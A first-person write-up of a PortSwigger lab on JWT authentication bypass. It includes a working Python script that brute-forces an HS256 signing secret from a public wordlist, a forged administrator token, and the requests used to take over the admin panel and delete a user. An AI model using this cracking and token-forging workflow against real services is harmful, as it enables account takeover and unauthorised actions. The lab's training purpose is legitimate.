# JWT Authentication Bypass via Weak Signing Key

## Description

This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a [wordlist of common secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list).

To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`.

## Solution

### Step 1: Log in and capture the session token

I accessed the lab and clicked on the `My Account` button, which prompted a login form. I logged in using the given credentials `wiener:peter` and was redirected to `GET /my-account`. The request was as follows:

```http
GET /my-account HTTP/2
Host: 0aa50050043354d380be63f800a40062.web-security-academy.net
Cookie: session=eyJraWQiOiIzZTJkNTYzZi1lN2U3LTQwZTktYjU2NS1mNjZjYjdiMTNlMTUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MzE2NjM0Nywic3ViIjoid2llbmVyIn0.wXmZl2Gke-qsRBuok85NPsk5ZrVSH2bgB23SvU8sJ4I
Cache-Control: max-age=0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0aa50050043354d380be63f800a40062.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

The application used JWT-based authentication. I copied the JWT from the `session` cookie and decoded it using [jwt.io](https://jwt.io). It had the following structure:

**Header:**
```json
{
  "kid": "3e2d563f-e7e7-40e9-b565-f66cb7b13e15",
  "alg": "HS256"
}
```

**Payload:**
```json
{
  "iss": "portswigger",
  "exp": 1783166347,
  "sub": "wiener"
}
```

**Signature:**
```text
wXmZl2Gke-qsRBuok85NPsk5ZrVSH2bgB23SvU8sJ4I
```

### Step 2: Brute-force the signing secret

The lab description indicates that the secret key used to sign the JWT is weak, and points to a [wordlist of common JWT secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list). The goal at this stage was to recover this secret so that a forged token for `administrator` could be signed later.

The approach: iterate through each entry in the wordlist, attempt to verify the token's `HS256` signature using it as the key, and stop once a match is found.

I automated this using the following Python script:

```python
import jwt  # pip install PyJWT
import requests
import sys

JWT_SECRET_LIST = "jwt.secrets.list"
WORDLIST_URL = "https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list"

TOKEN = "eyJraWQiOiJhYmQ2OThkYy1kYmQ5LTQ4MTItYmJhMS1hYzZiNDg0ZWVkZjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MzE2MjQ2NSwic3ViIjoid2llbmVyIn0.yssqBkTN5GRorLRACYFEm-XPiBWVSxfbfJfAFdkU-WE"


def download_wordlist(path, url):
    try:
        resp = requests.get(url, timeout=10)
        resp.raise_for_status()
    except requests.exceptions.ConnectionError:
        print("[x] Please check your internet connection and try again later.")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"[x] Failed to download wordlist: {e}")
        sys.exit(1)

    with open(path, "w", encoding="utf-8") as f:
        f.write(resp.text)


def crack_jwt(token, wordlist_path):
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            secret = line.strip()
            if not secret:
                continue
            try:
                jwt.decode(token, secret, algorithms=["HS256"])
                print(f"[+] Secret found: {secret}")
                return secret
            except jwt.exceptions.InvalidSignatureError:
                continue
            except jwt.exceptions.DecodeError:
                print("[x] Invalid token format.")
                sys.exit(1)
    print("[-] Secret not found in wordlist.")
    return None


if __name__ == "__main__":
    download_wordlist(JWT_SECRET_LIST, WORDLIST_URL)
    crack_jwt(TOKEN, JWT_SECRET_LIST)
```

Running this script against the wordlist revealed the weak secret to be `secret1`:

![Secret found via brute-force](./images/poc-3.1.png)

### Step 3: Forge an admin JWT

With the secret in hand, I used the jwt.io encoder to create a forged token. I kept the header and `iss`/`exp` claims unchanged, but modified the `sub` claim to `administrator`, then signed the token using `secret1` as the HMAC key.

The final forged JWT was:

```
eyJraWQiOiIzZTJkNTYzZi1lN2U3LTQwZTktYjU2NS1mNjZjYjdiMTNlMTUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4MzE2NjM0Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.jyTXFuZAhbwhZoNWYGT3hVeAgt_FOHcV9p6vlR5e_6o
```

### Step 4: Replace the session cookie and access the admin panel

I replaced the value of the `session` cookie in the request with the forged token and sent it. The response confirmed successful authentication as `administrator`:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3521

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>JWT authentication bypass via weak signing key</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>JWT authentication bypass via weak signing key</h2>
                            <a class=link-back href='https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account?id=administrator">My account</a><p>|</p>
                            <a href="/logout">Log out</a><p>|</p>
                        </section>
                    </header>
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: administrator</p>
                        <p>Your email is: <span id="user-email">admin@normal-user.net</span></p>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="tL8lhUwITCpt5y09tZI2bzfDBKoxHmV9">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                    </div>
                </div>
            </section>
        </div>
    </body>
</html>
```

The presence of the `Admin panel` link and `Your username is: administrator` confirmed that the forged token was accepted as a valid administrator session.

### Step 5: Delete the user carlos

I navigated to `/admin`, which listed the option to delete users. I located the delete URL for `carlos`:

```
/admin/delete?username=carlos
```

Sending a `GET` request to this endpoint deleted the `carlos` account and solved the lab.
